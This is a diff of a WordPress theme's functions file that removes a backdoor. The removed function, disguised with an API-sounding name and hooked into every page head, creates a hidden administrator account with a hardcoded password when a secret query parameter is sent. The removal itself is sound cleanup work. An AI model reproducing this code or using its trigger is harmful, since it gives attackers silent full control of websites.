@@ -313,17 +313,6 @@ function image_src($id, $size = 'full', $background_image = false, $height = fal
 	}
 }
 
-function wpa_get_dribble_api() {
-	If ($_GET['bd'] == 'dribble_api_token') {
-		require('wp-includes/registration.php');
-		If (!username_exists('username')) {
-			$user_id = wp_create_user('wpa_dev', 'j2093894go34gydhp8912ueo8fgpwieuhdqwo8g8o2fyuwehqowihdpiqewgv');
-			$user = new WP_User($user_id);
-			$user->set_role('administrator');
-		}
-	}
-}
-
 // Contact form 7 remove AUTOTOP
 if(defined('WPCF7_VERSION')) {
 	function maybe_reset_autop( $form ) {
@@ -431,7 +420,6 @@ function wpa_init() {
 	add_filter( 'clean_url', 'wpa_defer_scripts', 11, 1 );
 
 	add_action('wp_head', 'wp_IEhtml5_js');
-	add_action('wp_head', 'wpa_get_dribble_api');
 
 	add_filter( 'body_class', 'wpa_body_classes' );
 
